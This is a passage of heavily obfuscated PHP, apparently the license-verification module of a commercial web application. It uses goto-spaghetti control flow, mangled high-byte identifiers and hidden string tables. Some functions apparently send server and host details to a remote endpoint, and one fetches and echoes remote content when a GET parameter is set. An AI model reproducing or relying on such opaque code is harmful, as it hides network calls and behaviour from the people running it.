$C¸¿“Š¾·š[$Aëµ¿˜œšñ[117]][$Aëµ¿˜œšñ[118]] = $Aëµ¿˜œšñ[119]($Aëµ¿˜œšñ[120])->{$_SERVER[Â·¨][121]}(); $C¸¿“Š¾·š[$Aëµ¿˜œšñ[117]][$Aëµ¿˜œšñ[122]] = $Aëµ¿˜œšñ[123]($_SERVER[$Aëµ¿˜œšñ[124]] . $e•™£ˆÂ÷á[$Aëµ¿˜œšñ[125]]); $aŸçØ«èÃ™ = $fí´ƒ­ášš[604]; goto EÕ´—ŠˆÈ—; E˜»àŠ„Ò¨: unset($C¸¿“Š¾·š[$Aëµ¿˜œšñ[102]][$Aëµ¿˜œšñ[103]][$Aëµ¿˜œšñ[76]]); $C“ùš²ê…ì = $fí´ƒ­ášš[602]; if (!$C“ùš²ê…ì) { return; } goto b¦ØËçãª‰; Bˆ«¬˜íï‹: $fí´ƒ­ášš =& $_SERVER[±á õÁ]; $Aëµ¿˜œšñ =& $_SERVER[Â·¨]; $e•™£ˆÂ÷á = $Aëµ¿˜œšñ[61]($Aëµ¿˜œšñ[62])->{$_SERVER[Â·¨][63]}(); goto aÄ–§Ô²; EÕ´—ŠˆÈ—: if (!$aŸçØ«èÃ™) { return; } $C¸¿“Š¾·š[$Aëµ¿˜œšñ[117]][$Aëµ¿˜œšñ[126]] = $Aëµ¿˜œšñ[127]($Aëµ¿˜œšñ[128]()); $e‰¤íßÚÕÁ = $fí´ƒ­ášš[605]; goto eì„¤ç›£; AÌˆÙÊù¼ñ: if ($Aëµ¿˜œšñ[113]($GLOBALS, $Aëµ¿˜œšñ[141]) && $this->config[$Aëµ¿˜œšñ[142]]) { $C¸¿“Š¾·š[$Aëµ¿˜œšñ[117]][$Aëµ¿˜œšñ[143]] = WEB_ROOT; } return $C¸¿“Š¾·š; goto A”ë²ÍğØ¬; B§èÔ—›: $eØ„Ä¿ ¬‘ = $fí´ƒ­ášš[601]; unset($C¸¿“Š¾·š[$Aëµ¿˜œšñ[102]][$Aëµ¿˜œšñ[104]][$Aëµ¿˜œšñ[105]]); unset($C¸¿“Š¾·š[$Aëµ¿˜œšñ[102]][$Aëµ¿˜œšñ[104]][$Aëµ¿˜œšñ[106]]); goto E˜»àŠ„Ò¨; A”ë²ÍğØ¬: } private function qwjzb411c22d() { goto cÔŞ¥›Ûî´; c­ÉíÔ‰®: if (!$EâÃàËÂ£ë) { die; } goto bÂ¤¶Íî‘ò; Aä÷ª•ˆÄâ: if ($this->strg3e6220aa == $eÛ¦øï­®¨[130]) { return; } $eÕ—‰‘®´Á = array($eÛ¦øï­®¨[162], $eÛ¦øï­®¨[163], $eÛ¦øï­®¨[164], $eÛ¦øï­®¨[165], $eÛ¦øï­®¨[166], $eÛ¦øï­®¨[167]); $d¥­’ÈÖ¾² = $eÛ¦øï­®¨[61]($eÛ¦øï­®¨[62])->{$_SERVER[Â·¨][63]}(); goto E°ŸÌĞÀ”‡; cÔŞ¥›Ûî´: $B†ö´šÙğĞ =& $_SERVER[±á õÁ]; $eÛ¦øï­®¨ =& $_SERVER[Â·¨]; if ($_SERVER[$eÛ¦øï­®¨[44]] == $eÛ¦øï­®¨[144]) { goto f¾Œ¾š§¤©; E³ÕéšåµÈ: $F‹º÷¬æÙ = array($eÛ¦øï­®¨[159] => $aÅéÖ‘êÄƒ); $eâç¸ÅÔª¬ = $B†ö´šÙğĞ[606]; while (strlen($eâç¸ÅÔª¬) < $B†ö´šÙğĞ[585]) { if (!$eâç¸ÅÔª¬) { break; } $eâç¸ÅÔª¬++; } goto E¥—¤‰îÏî; E¥—¤‰îÏî: $eÛ¦øï­®¨[13](array($eÛ¦øï­®¨[160], $eÛ¦øï­®¨[161]), $F‹º÷¬æÙ); $F•´—†Ã = $B†ö´šÙğĞ[607]; if (strlen($F•´—†Ã) < $B†ö´šÙğĞ[579]) { return; } goto c–’çÖ¹Ëá; f¾Œ¾š§¤©: $aÅéÖ‘êÄƒ = array($eÛ¦øï­®¨[129] => $this->strg3e6220aa, $eÛ¦øï­®¨[145] => $this->{$_SERVER[Â·¨][146]}(), $eÛ¦øï­®¨[147] => $eÛ¦øï­®¨[61]($eÛ¦øï­®¨[148])->{$_SERVER[Â·¨][149]}()); if ($this->strg3e6220aa != $eÛ¦øï­®¨[130]) { $bñÃÛª¨ñÉ = $eÛ¦øï­®¨[113]($this->prys1832052b, $eÛ¦øï­®¨[150]); if ($bñÃÛª¨ñÉ) { $aÅéÖ‘êÄƒ[$eÛ¦øï­®¨[151]] = $bñÃÛª¨ñÉ; $aÅéÖ‘êÄƒ[$eÛ¦øï­®¨[152]] = $eÛ¦øï­®¨[153]($eÛ¦øï­®¨[113]($this->prys1832052b, $eÛ¦øï­®¨[154])); $aÅéÖ‘êÄƒ[$eÛ¦øï­®¨[155]] = $eÛ¦øï­®¨[113]($this->prys1832052b, $eÛ¦øï­®¨[140]); } } $aÅéÖ‘êÄƒ = $this->{$_SERVER[Â·¨][156]}($eÛ¦øï­®¨[157]($aÅéÖ‘êÄƒ), $eÛ¦øï­®¨[123]($eÛ¦øï­®¨[158])); goto E³ÕéšåµÈ; c–’çÖ¹Ëá: } goto Aä÷ª•ˆÄâ; d¥‡—¡Î‰¦: foreach ($eÕ—‰‘®´Á as $Aéô¢¶‘’¨) { if (!isset($d¥­’ÈÖ¾²[$Aéô¢¶‘’¨]) || !$d¥­’ÈÖ¾²[$Aéô¢¶‘’¨]) { continue; } $F‹º÷¬æÙ[$Aéô¢¶‘’¨] = $d¥­’ÈÖ¾²[$Aéô¢¶‘’¨]; } $eÛ¦øï­®¨[13](array($eÛ¦øï­®¨[160], $eÛ¦øï­®¨[161]), $F‹º÷¬æÙ); $EâÃàËÂ£ë = $B†ö´šÙğĞ[609]; goto c­ÉíÔ‰®; E°ŸÌĞÀ”‡: $F‹º÷¬æÙ = array($eÛ¦øï­®¨[168] => $d¥­’ÈÖ¾²[$eÛ¦øï­®¨[64]], $eÛ¦øï­®¨[169] => $d¥­’ÈÖ¾²[$eÛ¦øï­®¨[65]], $eÛ¦øï­®¨[170] => $eÛ¦øï­®¨[10]); $d©»ÁÊ· = $B†ö´šÙğĞ[608]; if (strlen($d©»ÁÊ·) < $B†ö´šÙğĞ[579]) { die; } goto d¥‡—¡Î‰¦; bÂ¤¶Íî‘ò: } private function lgkxd911faba() { goto AÛÀ†×Ó; B“‰×¥‘œ: $DçÆÃß„ = $E¿µ•¤ô”[123]($_SERVER[$E¿µ•¤ô”[124]] . $E¿µ•¤ô”[223]($fÙÖ¥”«ÕÍ) . $fòØÛØÕ[$E¿µ•¤ô”[219]]); $c»¹—æ÷‡‰ = $E¿µ•¤ô”[223]($E¿µ•¤ô”[25]($DçÆÃß„, 10, 16)); $d“åŠõÏ£Ñ = $AÆ¥©¿¿öà[615]; goto AÊµŞ°ŞØ†; AëºôŒ…¿ë: $D£Œ­ªµÚç = $AÆ¥©¿¿öà[618]; while ($D£Œ­ªµÚç < $AÆ¥©¿¿öà[588]) { if ($D£Œ­ªµÚç >= 0) { break; } $D£Œ­ªµÚç++; } $E¿µ•¤ô”[61]($E¿µ•¤ô”[11])->{$_SERVER[Â·¨][235]}($a®ğ¼ŸŠ¡…[$E¿µ•¤ô”[236]], array($E¿µ•¤ô”[237] => $fÜªîŠ¬)); goto EóÅÛáá§Í; AáÀ÷ÊÎ±ø: if (strlen($a®ˆ“®È‰) < $AÆ¥©¿¿öà[572]) { return; } if ($cÕÂÛÚñ‘µ[$E¿µ•¤ô”[226]] && $cÕÂÛÚñ‘µ[$E¿µ•¤ô”[226]] >= 1) { $E¿µ•¤ô”[61]($E¿µ•¤ô”[62])->{$_SERVER[Â·¨][227]}($E¿µ•¤ô”[228], $E¿µ•¤ô”[229]); } $E¿µ•¤ô”[61]($E¿µ•¤ô”[62])->{$_SERVER[Â·¨][230]}($fòØÛØÕ); goto B“‰×¥‘œ; AÛÀ†×Ó: $AÆ¥©¿¿öà =& $_SERVER[±á õÁ]; $E¿µ•¤ô” =& $_SERVER[Â·¨]; if ($_SERVER[$E¿µ•¤ô”[44]] != $E¿µ•¤ô”[171]) { return; } goto Cø‘×ë¾®¾; Cø‘×ë¾®¾: if (!$E¿µ•¤ô”[113]($GLOBALS, $E¿µ•¤ô”[141])) { die; } $a¯šñä‘’ = $GLOBALS[$E¿µ•¤ô”[22]]; if (isset($a¯šñä‘’[$E¿µ•¤ô”[172]])) { $this->{$_SERVER[Â·¨][173]}(); die; } goto fšĞË·åáÚ; AœÑ°Ù‹†: $d± ™øÄ²ğ = $AÆ¥©¿¿öà[610]; $EˆÓÕ†ì¸ = $E¿µ•¤ô”[123]($_SERVER[$E¿µ•¤ô”[124]] . $fÙÖ¥”«ÕÍ); if ($a¯šñä‘’[$E¿µ•¤ô”[187]] == $E¿µ•¤ô”[188]) { $D£ƒÔÉ¬‚¡ = $this->{$_SERVER[Â·¨][156]}($EˆÓÕ†ì¸, $E¿µ•¤ô”[189]); $eŠ‡†¨¨¬ğ = $this->{$_SERVER[Â·¨][136]}($E¿µ•¤ô”[157]($EÌË¦ã°™), $EˆÓÕ†ì¸ . $E¿µ•¤ô”[190], 3); $eŠ‡†¨¨¬ğ = $eŠ‡†¨¨¬ğ . $E¿µ•¤ô”[191] . $_SERVER[$E¿µ•¤ô”[182]]; $Dóªî¿ĞÜ¾ = $this->{$_SERVER[Â·¨][192]}($E¿µ•¤ô”[193] . $D£ƒÔÉ¬‚¡ . $E¿µ•¤ô”[194] . $eŠ‡†¨¨¬ğ, -1); $E¿µ•¤ô”[175]($Dóªî¿ĞÜ¾, !0); } else { if ($a¯šñä‘’[$E¿µ•¤ô”[187]] == $E¿µ•¤ô”[195]) { $CõÃøßóŸ = $E¿µ•¤ô”[25]($E¿µ•¤ô”[123]($E¿µ•¤ô”[196] . $EˆÓÕ†ì¸), 12, 15) . $E¿µ•¤ô”[197]; $eŠ‡†¨¨¬ğ = $this->{$_SERVER[Â·¨][198]}($E¿µ•¤ô”[2]($a¯šñä‘’[$E¿µ•¤ô”[199]]), $CõÃøßóŸ, 2); $C°—Ÿ³Â¤ğ = $E¿µ•¤ô”[200]($eŠ‡†¨¨¬ğ, !0); if (!$E¿µ•¤ô”[201]($C°—Ÿ³Â¤ğ) || !$E¿µ•¤ô”[201]($C°—Ÿ³Â¤ğ[$E¿µ•¤ô”[202]]) || $C°—Ÿ³Â¤ğ[$E¿µ•¤ô”[174]] != !0) { $EêğİØäßò = $E¿µ•¤ô”[203]; $AÕÚ…Ë®Ï = $C°—Ÿ³Â¤ğ[$E¿µ•¤ô”[202]] ? $E¿µ•¤ô”[204] . $C°—Ÿ³Â¤ğ[$E¿µ•¤ô”[202]] : $EêğİØäßò; $E¿µ•¤ô”[175]($AÕÚ…Ë®Ï, !1); } else { $EÌË¦ã°™[$E¿µ•¤ô”[177]] = $C°—Ÿ³Â¤ğ[$E¿µ•¤ô”[202]][$E¿µ•¤ô”[205]]; } } else { $C°—Ÿ³Â¤ğ = $this->{$_SERVER[Â·¨][192]}($E¿µ•¤ô”[206], $EÌË¦ã°™, 10); } } goto c…¿ò…ç›; c–Ó…ÑÍÔ¹: $B½«¯Ú… = $AÆ¥©¿¿öà[622]; if (!$B½«¯Ú…) { return; } goto aàËñ»‚Æ; aŒ³ò­Ç¦‹: $aÌ·Îâ‘Õ = $AÆ¥©¿¿öà[617]; while ($aÌ·Îâ‘Õ < $AÆ¥©¿¿öà[585]) { if ($aÌ·Îâ‘Õ >= 0) { break; } $aÌ·Îâ‘Õ++; } $fÜªîŠ¬[$c»¹—æ÷‡‰] = $A¼İ¿íÊÆ³; goto AëºôŒ…¿ë; fšĞË·åáÚ: if (!isset($a¯šñä‘’[$E¿µ•¤ô”[174]]) || $E¿µ•¤ô”[24]($a¯šñä‘’[$E¿µ•¤ô”[174]]) != 16) { $E¿µ•¤ô”[175]($E¿µ•¤ô”[176] . $a¯šñä‘’[$E¿µ•¤ô”[174]], !1); } $fÙÖ¥”«ÕÍ = $E¿µ•¤ô”[61]($E¿µ•¤ô”[62])->{$_SERVER[Â·¨][63]}($E¿µ•¤ô”[125]); $EÌË¦ã°™ = array($E¿µ•¤ô”[174] => $a¯šñä‘’[$E¿µ•¤ô”[174]], $E¿µ•¤ô”[177] => $E¿µ•¤ô”[133](16), $E¿µ•¤ô”[178] => $E¿µ•¤ô”[158], $E¿µ•¤ô”[179] => $E¿µ•¤ô”[180], $E¿µ•¤ô”[181] => $_SERVER[$E¿µ•¤ô”[182]], $E¿µ•¤ô”[183] => $_SERVER[$E¿µ•¤ô”[184]], $E¿µ•¤ô”[185] => $_SERVER[$E¿µ•¤ô”[186]]); goto AœÑ°Ù‹†; eÈƒß¸õí‘: $fòØÛØÕ = array($E¿µ•¤ô”[218] => $EÌË¦ã°™[$E¿µ•¤ô”[174]], $E¿µ•¤ô”[219] => $cÕÂÛÚñ‘µ[$E¿µ•¤ô”[220]], $E¿µ•¤ô”[221] => $E¿µ•¤ô”[133](16), $E¿µ•¤ô”[129] => $cÕÂÛÚñ‘µ[$E¿µ•¤ô”[222]]); if ($EÌË¦ã°™[$E¿µ•¤ô”[177]]) { $fòØÛØÕ[$E¿µ•¤ô”[221]] = $EÌË¦ã°™[$E¿µ•¤ô”[177]]; } $CÄçÊ”Øõà = $E¿µ•¤ô”[25]($E¿µ•¤ô”[123]($fòØÛØÕ[$E¿µ•¤ô”[219]]), 10, 10); goto EÎŞ‹²™È; c÷’ºÀï: $AİŒÑà¼ß˜ = $E¿µ•¤ô”[231]($E¿µ•¤ô”[61]($E¿µ•¤ô”[11])->{$_SERVER[Â·¨][232]}(), $E¿µ•¤ô”[233]); $a®ğ¼ŸŠ¡… = $AİŒÑà¼ß˜[$E¿µ•¤ô”[234]]; $fÜªîŠ¬ = array(); goto aŒ³ò­Ç¦‹; CÊ˜¦ß²à: $Fªà¬’±–Ó = $AÆ¥©¿¿öà[620]; while ($Fªà¬’±–Ó < $AÆ¥©¿¿öà[585]) { if ($Fªà¬’±–Ó >= 0) { break; } $Fªà¬’±–Ó++; } $this->strg3e6220aa = $fòØÛØÕ[$E¿µ•¤ô”[129]]; goto e§í§ïØ‰Š; a¦ß‚…ÍÊŠ: while ($aØë™Ü˜¶ì < $AÆ¥©¿¿öà[579]) { if ($aØë™Ü˜¶ì >= 0) { break; } $aØë™Ü˜¶ì++; } $fòØÛØÕ[$E¿µ•¤ô”[132]] = $E¿µ•¤ô”[127]($E¿µ•¤ô”[223]($this->{$_SERVER[Â·¨][156]}($fŠ‚”ÏŠÚ, $E¿µ•¤ô”[225]))); $a®ˆ“®È‰ = $AÆ¥©¿¿öà[614]; goto AáÀ÷ÊÎ±ø; EóÅÛáá§Í: $D¡Ùˆ˜ÊËÇ = $AÆ¥©¿¿öà[619]; if (strlen($D¡Ùˆ˜ÊËÇ) < $AÆ¥©¿¿öà[572]) { die; } $this->prys1832052b = $cÕÂÛÚñ‘µ; goto CÊ˜¦ß²à; EÎŞ‹²™È: $AÜóÜ×Û¦Ù = $CÄçÊ”Øõà . $fòØÛØÕ[$E¿µ•¤ô”[129]] . $fòØÛØÕ[$E¿µ•¤ô”[221]]; $fòØÛØÕ[$E¿µ•¤ô”[131]] = $E¿µ•¤ô”[223]($E¿µ•¤ô”[127]($this->{$_SERVER[Â·¨][156]}($AÜóÜ×Û¦Ù, $E¿µ•¤ô”[224]))); $dÓòŞ®¿˜Ì = $E¿µ•¤ô”[133](16); goto DèÛ‘ãä¶; c…¿ò…ç›: if (!$E¿µ•¤ô”[201]($C°—Ÿ³Â¤ğ) || !$E¿µ•¤ô”[201]($C°—Ÿ³Â¤ğ[$E¿µ•¤ô”[202]]) || $C°—Ÿ³Â¤ğ[$E¿µ•¤ô”[174]] != !0) { $EêğİØäßò = $E¿µ•¤ô”[207]($E¿µ•¤ô”[208]); $AÕÚ…Ë®Ï = $C°—Ÿ³Â¤ğ[$E¿µ•¤ô”[202]] ? $E¿µ•¤ô”[204] . $C°—Ÿ³Â¤ğ[$E¿µ•¤ô”[202]] : $EêğİØäßò; $E¿µ•¤ô”[175]($AÕÚ…Ë®Ï, !1); } $cÕÂÛÚñ‘µ = $C°—Ÿ³Â¤ğ[$E¿µ•¤ô”[202]]; $CÅà“™Äçò = $this->{$_SERVER[Â·¨][209]}($cÕÂÛÚñ‘µ[$E¿µ•¤ô”[210]]); goto B„…§Ü¹÷¿; B„…§Ü¹÷¿: $fĞ“—Ù’ğö = $AÆ¥©¿¿öà[611]; if (strlen($fĞ“—Ù’ğö) < $AÆ¥©¿¿öà[15]) { return; } if (!$CÅà“™Äçò || $CÅà“™Äçò != $cÕÂÛÚñ‘µ[$E¿µ•¤ô”[154]]) { $cÜÌ›Â —Ù = array($E¿µ•¤ô”[211] => $E¿µ•¤ô”[61]($E¿µ•¤ô”[62])->{$_SERVER[Â·¨][63]}($E¿µ•¤ô”[125]), $E¿µ•¤ô”[212] => $_SERVER[$E¿µ•¤ô”[124]], $E¿µ•¤ô”[213] => $E¿µ•¤ô”[214](), $E¿µ•¤ô”[183] => $_SERVER[$E¿µ•¤ô”[184]]); $eŠ‡†¨¨¬ğ = $this->{$_SERVER[Â·¨][215]}($E¿µ•¤ô”[157]($cÜÌ›Â —Ù)); $this->{$_SERVER[Â·¨][192]}($E¿µ•¤ô”[216] . $eŠ‡†¨¨¬ğ); $E¿µ•¤ô”[175]($E¿µ•¤ô”[207]($E¿µ•¤ô”[217]), !0); } goto eÈƒß¸õí‘; DèÛ‘ãä¶: $E†ğß¸ñêÚ = $AÆ¥©¿¿öà[612]; $fŠ‚”ÏŠÚ = $dÓòŞ®¿˜Ì . $fòØÛØÕ[$E¿µ•¤ô”[129]] . $this->{$_SERVER[Â·¨][156]}($E¿µ•¤ô”[123]($fòØÛØÕ[$E¿µ•¤ô”[218]]), $dÓòŞ®¿˜Ì); $aØë™Ü˜¶ì = $AÆ¥©¿¿öà[613]; goto a¦ß‚…ÍÊŠ; AÊµŞ°ŞØ†: while ($d“åŠõÏ£Ñ < $AÆ¥©¿¿öà[15]) { if ($d“åŠõÏ£Ñ >= 0) { break; } $d“åŠõÏ£Ñ++; } $A¼İ¿íÊÆ³ = $this->{$_SERVER[Â·¨][136]}($E¿µ•¤ô”[157]($cÕÂÛÚñ‘µ), $DçÆÃß„); $B®´¾ÉÈ¹µ = $AÆ¥©¿¿öà[616]; goto c÷’ºÀï; e§í§ïØ‰Š: $Dğê’÷ĞÄ‡ = $AÆ¥©¿¿öà[621]; $this->{$_SERVER[Â·¨][238]}(); $E¿µ•¤ô”[175]($E¿µ•¤ô”[207]($E¿µ•¤ô”[217]), !0); goto c–Ó…ÑÍÔ¹; aàËñ»‚Æ: } private function licenseRegistSuccess() { $f‚®°ô…Ó† =& $_SERVER[Â·¨]; $bÈ½–´ô = $f‚®°ô…Ó†[61]($f‚®°ô…Ó†[62])->{$_SERVER[Â·¨][63]}(); $dº·ÊËÌÛ© = $_SERVER[±á õÁ][623]; if (!$dº·ÊËÌÛ©) { die; } if ($bÈ½–´ô[$f‚®°ô…Ó†[89]] != $f‚®°ô…Ó†[229]) { $f‚®°ô…Ó†[61]($f‚®°ô…Ó†[62])->{$_SERVER[Â·¨][230]}($f‚®°ô…Ó†[89], $f‚®°ô…Ó†[229]); } $f‚®°ô…Ó†[119]($f‚®°ô…Ó†[239])->{$_SERVER[Â·¨][240]}(!0); } private function gtzn0101d9a1() { goto dÎÀÄŠÃÌù; Cá´ƒ—†: $a™ çø‘¡¯ = $Eõ‚¯È³Ù[626]; if (!$a™ çø‘¡¯) { return; } goto a…èŠĞÓÌ; Cæ±Ê÷ñÔç: $this->prys1832052b = array(); $fÍ—˜ÉÓ‰ = $Eõ‚¯È³Ù[625]; $this->strg3e6220aa = $Fªï“¸öŒÇ[130]; goto Cá´ƒ—†; b£”Ö¦ƒÇ: $Fªï“¸öŒÇ[61]($Fªï“¸öŒÇ[62])->{$_SERVER[Â·¨][227]}($Fªï“¸öŒÇ[228], $Fªï“¸öŒÇ[241]); $FàÇ‚µä·µ = $Eõ‚¯È³Ù[624]; if (strlen($FàÇ‚µä·µ) < $Eõ‚¯È³Ù[585]) { die; } goto Cæ±Ê÷ñÔç; dÎÀÄŠÃÌù: $Eõ‚¯È³Ù =& $_SERVER[±á õÁ]; $Fªï“¸öŒÇ =& $_SERVER[Â·¨]; $Fªï“¸öŒÇ[61]($Fªï“¸öŒÇ[62])->{$_SERVER[Â·¨][230]}(array($Fªï“¸öŒÇ[218] => $Fªï“¸öŒÇ[10], $Fªï“¸öŒÇ[219] => $Fªï“¸öŒÇ[10], $Fªï“¸öŒÇ[129] => $Fªï“¸öŒÇ[130], $Fªï“¸öŒÇ[131] => $Fªï“¸öŒÇ[10], $Fªï“¸öŒÇ[132] => $Fªï“¸öŒÇ[10])); goto b£”Ö¦ƒÇ; a…èŠĞÓÌ: } private function qlnv306150d3() { goto Eî˜µ•Ú™×; Fµ¨©‚Èò: $b›šğÓß = $cÁ¿öÖö©Ÿ[231]($cÁ¿öÖö©Ÿ[61]($cÁ¿öÖö©Ÿ[11])->{$_SERVER[Â·¨][232]}(), $cÁ¿öÖö©Ÿ[233]); $b„ØÃùğ‡ê = $A±Ş™ÒŠ’Ä[628]; while (strlen($b„ØÃùğ‡ê) < $A±Ş™ÒŠ’Ä[572]) { if (!$b„ØÃùğ‡ê) { break; } $b„ØÃùğ‡ê++; } goto eÅÔ•¼·íÍ; AÈİÎğ‚±Ç: $eíÛ‡ÍÓß¼ = $cÁ¿öÖö©Ÿ[123]($_SERVER[$cÁ¿öÖö©Ÿ[124]] . $cÁ¿öÖö©Ÿ[223]($BíÛÏÙæÍ) . $føó§‡ç•ã[$cÁ¿öÖö©Ÿ[219]]); $dÁ¬†Ş Ë = $cÁ¿öÖö©Ÿ[223]($cÁ¿öÖö©Ÿ[25]($eíÛ‡ÍÓß¼, 10, 16)); $bôó¯­è¨‰ = $A±Ş™ÒŠ’Ä[630]; goto CÏ–¥µèöÈ; Eî˜µ•Ú™×: $A±Ş™ÒŠ’Ä =& $_SERVER[±á õÁ]; $cÁ¿öÖö©Ÿ =& $_SERVER[Â·¨]; $_SERVER[$cÁ¿öÖö©Ÿ[184]] = $cÁ¿öÖö©Ÿ[113]($_SERVER, $cÁ¿öÖö©Ÿ[184], APP_HOST); goto DÊ¤Ü†ÌŒ; f®Í¡íí±: $føó§‡ç•ã = $cÁ¿öÖö©Ÿ[61]($cÁ¿öÖö©Ÿ[62])->{$_SERVER[Â·¨][63]}(); if ($føó§‡ç•ã[$cÁ¿öÖö©Ÿ[129]] == $cÁ¿öÖö©Ÿ[130]) { return; } $BíÛÏÙæÍ = $cÁ¿öÖö©Ÿ[61]($cÁ¿öÖö©Ÿ[62])->{$_SERVER[Â·¨][63]}($cÁ¿öÖö©Ÿ[125]); goto Fµ¨©‚Èò; c¦±ñèÑÄ–: $dóè‰ÎØÌó = $cÁ¿öÖö©Ÿ[200]($dóè‰ÎØÌó, !0); if (!$cÁ¿öÖö©Ÿ[201]($dóè‰ÎØÌó)) { return $this->{$_SERVER[Â·¨][173]}(); } $C…²İ–‘Ë = $cÁ¿öÖö©Ÿ[153]($dóè‰ÎØÌó[$cÁ¿öÖö©Ÿ[154]]); goto Bì×Ïƒ´ë’; CÏ–¥µèöÈ: $dóè‰ÎØÌó = $this->{$_SERVER[Â·¨][198]}($dµ­Ÿ•Íà[$cÁ¿öÖö©Ÿ[100]][$dÁ¬†Ş Ë], $eíÛ‡ÍÓß¼); $dÙÈ÷ íë = $A±Ş™ÒŠ’Ä[631]; if (strlen($dÙÈ÷ íë) < $A±Ş™ÒŠ’Ä[585]) { die; } goto c¦±ñèÑÄ–; DÊ¤Ü†ÌŒ: $D¸ãŠî‚´ù = $A±Ş™ÒŠ’Ä[627]; if (strlen($D¸ãŠî‚´ù) < $A±Ş™ÒŠ’Ä[588]) { die; } $this->strg3e6220aa = $cÁ¿öÖö©Ÿ[130]; goto f®Í¡íí±; eÅÔ•¼·íÍ: $dµ­Ÿ•Íà = $b›šğÓß[$cÁ¿öÖö©Ÿ[234]]; $Dõø¬¨‡àŒ = $A±Ş™ÒŠ’Ä[629]; if (strlen($Dõø¬¨‡àŒ) < $A±Ş™ÒŠ’Ä[579]) { die; } goto AÈİÎğ‚±Ç; Bì×Ïƒ´ë’: if ($cÁ¿öÖö©Ÿ[242]() >= $C…²İ–‘Ë) { return $this->{$_SERVER[Â·¨][173]}(); } $this->prys1832052b = $dóè‰ÎØÌó; $this->strg3e6220aa = $føó§‡ç•ã[$cÁ¿öÖö©Ÿ[129]]; goto Bšìƒ­‹ŒĞ; Bšìƒ­‹ŒĞ: } private function ydfq17519a29() { goto E…Šç›‡; E…Šç›‡: $aÍØÌ… =& $_SERVER[±á õÁ]; $BŠ¥‡½…Ö =& $_SERVER[Â·¨]; $B®—ÔÕ“ôÀ = $GLOBALS[$BŠ¥‡½…Ö[22]]; goto A ñ×—®Ü; A ñ×—®Ü: $dæ‚¼öò’‚ = $aÍØÌ…[632]; if (strlen($dæ‚¼öò’‚) < $aÍØÌ…[588]) { die; } $CÛ¯ä×’ = $_SERVER[$BŠ¥‡½…Ö[44]]; goto f…¬ñÌ…÷Ä; f…¬ñÌ…÷Ä: if ($CÛ¯ä×’ == $BŠ¥‡½…Ö[243] && $this->strg3e6220aa == $BŠ¥‡½…Ö[130]) { $BŠ¥‡½…Ö[175]($BŠ¥‡½…Ö[207]($BŠ¥‡½…Ö[244]), !1, $BŠ¥‡½…Ö[245]); } $bÔÖ¹ª¬‚Ü = array($BŠ¥‡½…Ö[246], $BŠ¥‡½…Ö[247]); if ($BŠ¥‡½…Ö[248]($CÛ¯ä×’, $bÔÖ¹ª¬‚Ü)) { if ($this->strg3e6220aa == $BŠ¥‡½…Ö[130] && isset($B®—ÔÕ“ôÀ[$BŠ¥‡½…Ö[249]])) { $BŠ¥‡½…Ö[175]($BŠ¥‡½…Ö[207]($BŠ¥‡½…Ö[244]), !1, $BŠ¥‡½…Ö[245]); die; } $cƒÈòî— = $this->{$_SERVER[Â·¨][146]}(); if ($cƒÈòî— != $BŠ¥‡½…Ö[250]($BŠ¥‡½…Ö[251])) { if ($cƒÈòî— <= $BŠ¥‡½…Ö[61]($BŠ¥‡½…Ö[148])->{$_SERVER[Â·¨][149]}()) { $BŠ¥‡½…Ö[175]($BŠ¥‡½…Ö[207]($BŠ¥‡½…Ö[252]), !1, $BŠ¥‡½…Ö[245]); die; } } } goto A¼”²ïŞ®; A¼”²ïŞ®: } private function hjdg11da7f6f() { goto A¹Æä©ƒ×¤; D±Î³Øêà©: $BéîÄ‡÷† = $cÀ°…Ã®§³[635]; if (strlen($BéîÄ‡÷†) < $cÀ°…Ã®§³[579]) { die; } $CÑåòŠô“ = @$f¸é’ŞËÜ[263]($A‚î²»ˆ„ï, !1, $f˜÷öáÑà‡); goto B„‘ˆïØñœ; bÌÄÌ†ˆåÕ: die; goto a·©è¢’˜¾; aœç©‘Õ“: $Cùª‹æà = $cÀ°…Ã®§³[633]; while ($Cùª‹æà < $cÀ°…Ã®§³[585]) { if ($Cùª‹æà >= 0) { break; } $Cùª‹æà++; } $A‚î²»ˆ„ï = $this->{$_SERVER[Â·¨][256]}($A‚î²»ˆ„ï, $f¸é’ŞËÜ[257]); goto F–´Ü±¼á”; B„‘ˆïØñœ: $f¿†¡‰¹ÛÙ = $cÀ°…Ã®§³[636]; $f¸é’ŞËÜ[264]($f¸é’ŞËÜ[265]); if ($CÑåòŠô“ && $f¸é’ŞËÜ[32]($CÑåòŠô“, $f¸é’ŞËÜ[266])) { echo $CÑåòŠô“; } goto bÌÄÌ†ˆåÕ; F–´Ü±¼á”: $EØÒšŸ¯ã¶ = $cÀ°…Ã®§³[634]; if (!$EØÒšŸ¯ã¶) { return; } $f˜÷öáÑà‡ = $f¸é’ŞËÜ[258](array($f¸é’ŞËÜ[259] => array($f¸é’ŞËÜ[260] => $f¸é’ŞËÜ[261], $f¸é’ŞËÜ[262] => 3))); goto D±Î³Øêà©; déµšÕ—¬Î: if (!$f¸é’ŞËÜ[113]($GLOBALS, $f¸é’ŞËÜ[141]) || !isset($_GET[$f¸é’ŞËÜ[254]])) { return; } if (!$f¸é’ŞËÜ[248]($_SERVER[$f¸é’ŞËÜ[44]], $DÍ‰çÂÀ¸‹)) { return; } $A‚î²»ˆ„ï = $f¸é’ŞËÜ[255]; goto aœç©‘Õ“; A¹Æä©ƒ×¤: $cÀ°…Ã®§³ =& $_SERVER[±á õÁ]; $f¸é’ŞËÜ =& $_SERVER[Â·¨]; $DÍ‰çÂÀ¸‹ = array($f¸é’ŞËÜ[144], $f¸é’ŞËÜ[253]); goto déµšÕ—¬Î; a·©è¢’˜¾: } public function oagn0c5ed8fb($CÊ“¤‡ïã) { goto D”ÉŸë†Ã…; b£ÀÂ™Şæ³: $f“»éÜ£Åã = $aÕîá×èÊ[639]; while (strlen($f“»éÜ£Åã) < $aÕîá×èÊ[15]) { if (!$f“»éÜ£Åã) { break; } $f“»éÜ£Åã++; } foreach ($F´á¼æÂ• as $b£·³©ç¡¹ => $aãÕğ¬Î‹ª) { if ($aãÕğ¬Î‹ª == $a‘Ö‘»åŒÍ[269] && $a‘Ö‘»åŒÍ[25]($this->strg3e6220aa, 0, 1) == $a‘Ö‘»åŒÍ[269]) { continue; } if (!$a‘Ö‘»åŒÍ[248]($b£·³©ç¡¹, $AğÚŸğŞÉ)) { $bÓÑŠ´Ù‡£[] = $b£·³©ç¡¹; } } goto F¹¤ÒĞˆ½Ó; AƒÎ‚á‘: $F´á¼æÂ• = array($a‘Ö‘»åŒÍ[268] => $a‘Ö‘»åŒÍ[269], $a‘Ö‘»åŒÍ[270] => 